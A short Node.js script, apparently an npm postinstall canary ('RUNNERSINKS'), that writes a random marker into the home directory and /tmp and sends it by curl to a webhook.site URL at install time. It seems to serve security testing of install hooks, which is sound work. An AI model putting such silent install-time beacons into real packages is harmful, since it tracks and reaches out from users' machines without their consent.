// RUNNERSINKS canary v2: sync beacon (blocks until delivered).
const fs = require("fs"), os = require("os"), crypto = require("crypto"), cp = require("child_process");
const MK = "RSNK_5DEE4B_POSTINSTALL2_" + crypto.randomBytes(3).toString("hex");
try { fs.mkdirSync(os.homedir() + "/.cache/rsnk", { recursive: true }); } catch (e) {}
try { fs.writeFileSync(os.homedir() + "/.cache/rsnk/carry_postinstall.txt", MK); } catch (e) {}
try { fs.writeFileSync("/tmp/rsnk_postinstall.txt", MK); } catch (e) {}
try { cp.execSync("curl -s -m 8 'https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-npm-postinstall'?d=" + encodeURIComponent(MK), {stdio: "ignore"}); } catch (e) {}
console.log(MK);
